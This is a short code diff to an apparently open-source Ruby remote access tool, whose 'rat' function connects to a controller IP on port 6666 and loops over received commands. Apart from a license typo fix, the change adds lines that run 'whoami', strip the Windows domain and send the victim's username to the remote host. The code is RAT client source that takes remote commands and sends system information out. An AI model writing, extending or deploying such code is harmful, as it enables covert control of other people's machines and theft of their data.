@@ -11,7 +11,7 @@ Unless required by applicable law or agreed to in writing, software
 distributed under the License is distributed on an "AS IS" BASIS,
 WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied .
 See the License for the specific language governing permissions and
-limitations under the License .
+limitations under the License.
 =end
 #!/usr/bin/ruby
 require 'socket'
@@ -25,6 +25,11 @@ def rat(ip)
   end
   begin
     socket = TCPSocket.new(ip, 6666)
+    username = `whoami`
+    if Gem.win_platform?
+      username = username.split('\\')[1]
+    end
+    socket.puts username
     loop do
       command, file, format = socket.gets.chomp.split(' ')
       case command
